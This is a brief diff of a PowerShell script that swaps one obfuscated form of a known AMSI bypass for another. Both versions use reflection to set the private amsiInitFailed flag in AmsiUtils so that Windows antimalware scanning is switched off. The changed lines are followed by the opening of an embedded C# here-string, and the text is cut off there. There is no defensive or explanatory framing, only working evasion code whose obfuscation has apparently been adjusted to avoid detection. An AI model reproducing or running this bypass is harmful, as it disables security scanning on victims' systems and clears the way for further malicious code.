@@ -1,7 +1,5 @@
-$a='am'
-$b='a'
-$c='s'
-[Ref].Assembly.GetType(('System.M{0}n{0}gement.Autom{0}tion.Am{1}iUtil{1}' -f $b,$c)).GetField(('{0}{2}iInitF{1}iled' -f $a,$b,$c), ('NonPublic,St{0}tic' -f $b)).SetValue($null,$true)
+$a='si'
+[Ref].Assembly.GetType(('System.Management.Automation.Am{0}Utils' -f $a)).GetField(('am{0}InitFailed' -f $a), 'NonPublic,Static').SetValue($null,$true)
 
 $ZQCUW = @"
 using System;
